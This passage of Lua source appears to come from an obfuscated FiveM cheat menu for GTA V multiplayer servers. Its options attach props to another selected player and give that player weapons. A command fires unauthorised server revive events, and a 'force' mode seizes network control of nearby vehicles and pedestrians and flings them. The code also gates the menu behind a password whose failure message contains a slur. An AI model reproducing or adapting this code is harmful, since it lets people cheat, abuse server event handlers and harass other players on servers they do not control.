                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                   elseif PowerFulSokin.sadh78asd7asgda("ramp4") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_skate_kickers"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                   elseif PowerFulSokin.sadh78asd7asgda("ramp5") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_skate_quartpipe"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                   elseif PowerFulSokin.sadh78asd7asgda("ramp6") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_skate_rail"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                   elseif PowerFulSokin.sadh78asd7asgda("ramp7") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_skate_spiner"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif PowerFulSokin.sadh78asd7asgda("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_weed_01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif PowerFulSokin.sadh78asd7asgda("UFO") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("p_spinning_anus_s"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif PowerFulSokin.sadh78asd7asgda("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_windmill_01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),39317),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                elseif PowerFulSokin.sadh78asd7asgda('ball') then
                    local ped = GetPlayerPed(SelectedPlayer)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local forwardx = GetEntityForwardX(ped)
                    local forwardy = GetEntityForwardY(ped)
                    local prop = CreateObject(GetHashKey("p_ld_soc_ball_01"), coords.x, coords.y, coords.z + 1, 180, true, true, true);
                    SetEntityLodDist(prop, 500)
                    SetEntityDynamic(prop, true)
                    SetEntityRecordsCollisions(prop, true)
                    SetEntityHasGravity(prop, true)
                    FreezeEntityPosition(prop, false)
                    SetEntityVelocity(prop, 0, 0, 0)
                    elseif PowerFulSokin.sadh78asd7asgda("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local input = KeyboardInput("Enter Prop Name", "", 100)
                        if IsModelValid(input) then
                            local obj = CreateObject(GetHashKey(input),coords.x,coords.y,coords.z,true,true,true)
                            if attachProp then
                                if asdh8asdh == 1 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                elseif asdh8asdh == 2 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                end
                            end 
                        else
                            drawNotification("Invalid Model!")
                        end
                    end
                
            
                

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if PowerFulSokin.sadh78asd7asgda(allWeapons[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
                    end
                end

                PowerFulSokin.sadha7sxzsa()
            elseif IsDisabledControlPressed(0, 163) then
                if sagd76asd then
                    PowerFulSokin.asd62116t6ds("PowerFulSokin")
                else
                    local temp = KeyboardInput("Enter Pass", "", 100)
                    if temp == p then
                        drawNotification("~g~Login Succesful!")
                        sagd76asd = false
                        PowerFulSokin.asd62116t6ds("PowerFulSokin")
                    else
                        drawNotification("~r~Login Failed are you retarted")
                        ForceSocialClubUpdate()
                    end
                end
            end

            Citizen.Wait(0)
        end
    end)

RegisterCommand("revive", function(source)
    TriggerServerEvent('esx_ambulancejob:revive')
    TriggerServerEvent('esx_ambulancejob:barabasz')
    TriggerEvent('voltagerp:revive')
end)

RegisterCommand("dv", function(source)
    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
    drawNotification("Vehicle Deleted")
end)

RegisterCommand("weapon", function(source, args)

GiveWeaponToPed(GetPlayerPed(-1), args[1], 250, false, true)

end,false)

RegisterCommand("car", function(source, args) 
local auto = args[1]
spawnCar(auto)
end,false)

function spawnCar(car)
    local car = GetHashKey(car)

    RequestModel(car)
    while not HasModelLoaded(car) do
        RequestModel(car)
        Citizen.Wait(0)
    end

    local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), false))
    local vehicle = CreateVehicle(car, x + 2, y + 2, z + 1, 0.0, true, false)
    SetEntityAsMissionEntity(vehicle, true, true)
end

local djs = {
{type=4, hash=-508849828, x=-254.83, y=2125.731, z=133.855, a=90.100},

{type=4, hash=-86969715, x=-1381.730, y=-614.330, z=31.500, a=141.220},
}

Citizen.CreateThread(function()

RequestModel(-508849828)
while not HasModelLoaded(-508849828) do
Wait(1)
end

for _, item in pairs(djs) do
dj = CreatePed(item.type, item.hash, item.x, item.y, item.z, item.a, true, true)
SetBlockingOfNonTemporaryEvents(dj, true)
SetPedDiesWhenInjured(dj, false)
SetPedCanPlayAmbientAnims(dj, true)
SetPedCanRagdollFromPlayerImpact(dj, false)
FreezeEntityPosition(dj, true)
TaskPlayAnim(dj,"anim@amb@nightclub@djs@solomun@","sol_idle_left_b_sol", 8.0, 0.0, -1, 1, 0, 0, 0, 0)
end
end)

RegisterCommand("clear", function(source)
        SetWeatherTypePersist("CLEAR")
        SetWeatherTypeNow("CLEAR")
        SetWeatherTypeNowPersist("CLEAR")
end)


local ForceTog = false
  
RegisterCommand('force', function(source, args)
    ForceMod()
end, false)

function ForceMod()
    ForceTog = not ForceTog

    if ForceTog then

    Citizen.CreateThread(function()
    ShowInfo("Force ~g~hasdh8ay ~r~\nPress E to use")

    local ForceKey = Keys["E"]
    local Force = 0.5
    local KeyPressed = false
    local KeyTimer = 0
    local KeyDelay = 15
    local Forcehasdh8ay = false
    local StartPush = false

    function forcetick()

    if (KeyPressed) then
        KeyTimer = KeyTimer + 1
        if(KeyTimer >= KeyDelay) then
            KeyTimer = 0
            KeyPressed = false
        end
    end



    if IsControlPressed(0, ForceKey) and not KeyPressed and not Forcehasdh8ay then
        KeyPressed = true
        Forcehasdh8ay = true
    end

    if (StartPush) then

        StartPush = false
        local pid = PlayerPedId()
        local CamRot = GetGameplayCamRot(2)

        local force = 5

        local Fx = -( math.sin(math.rad(CamRot.z)) * force*10 )
        local Fy = ( math.cos(math.rad(CamRot.z)) * force*10 )
        local Fz = force * (CamRot.x*0.2)

        local PlayerVeh = GetVehiclePedIsIn(pid, false)

        for k in EnumerateVehicles() do
            SetEntityInvincible(k, false)
            if IsEntityOnScreen(k) and k ~= PlayerVeh then
                ApplyForceToEntity(k, 1, Fx, Fy,Fz, 0,0,0, true, false, true, true, true, true)
            end
        end

        for k in EnumeratePeds() do
            if IsEntityOnScreen(k) and k ~= pid then
                ApplyForceToEntity(k, 1, Fx, Fy,Fz, 0,0,0, true, false, true, true, true, true)
            end
        end

    end


    if IsControlPressed(0, ForceKey) and not KeyPressed and Forcehasdh8ay then
        KeyPressed = true
        StartPush = true
        Forcehasdh8ay = false
    end

    if (Forcehasdh8ay) then
        local pid = PlayerPedId()
        local PlayerVeh = GetVehiclePedIsIn(pid, false)

        Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)

        DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, false, true, 2, nil, nil, false)

        for k in EnumerateVehicles() do
            SetEntityInvincible(k, true)
            if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                RequestControlOnce(k)
                FreezeEntityPosition(k, false)
                Oscillate(k, Markerloc, 0.5, 0.3)
            end
        end

        for k in EnumeratePeds() do
            if IsEntityOnScreen(k) and k ~= PlayerPedId() then
                RequestControlOnce(k)
                SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
                FreezeEntityPosition(k, false)
                Oscillate(k, Markerloc, 0.5, 0.3)
            end
        end

    end

    end

    while ForceTog do forcetick() Wait(0) end
end)
else ShowInfo("Force ~r~Disabled") end

end

function ShowInfo(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(true, false)
end

function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateEntities(initFunc, moveFunc, disposeFunc)
    return coroutine.wrap(function()
      local iter, id = initFunc()
      if not id or id == 0 then
        disposeFunc(iter)
        return
      end
  
      local enum = {handle = iter, destructor = disposeFunc}
      setmetatable(enum, entityEnumerator)
  
      local next = true
      repeat
        coroutine.yield(id)
        next, id = moveFunc(iter)
      until not next
  
      enum.destructor, enum.handle = nil, nil
      disposeFunc(iter)
    end)
end

function RequestControlOnce(entity)
    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

function Oscillate(entity, position, angleFreq, dampRatio)
    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq*angleFreq))
    local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
    local targetPos = SubVectors(pos1, pos2)

    ApplyForce(entity, targetPos)
end

function ApplyForce(entity, direction)
    ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
end

function SubVectors(vect1, vect2)
    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
end

function ScaleVector(vect, mult)
    return vector3(vect.x*mult, vect.y*mult, vect.z*mult)
end

function AddVectors(vect1, vect2)
    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
end

    RegisterCommand("jb", function(source,args,raw)
        hasdh8ay = false
    end, false)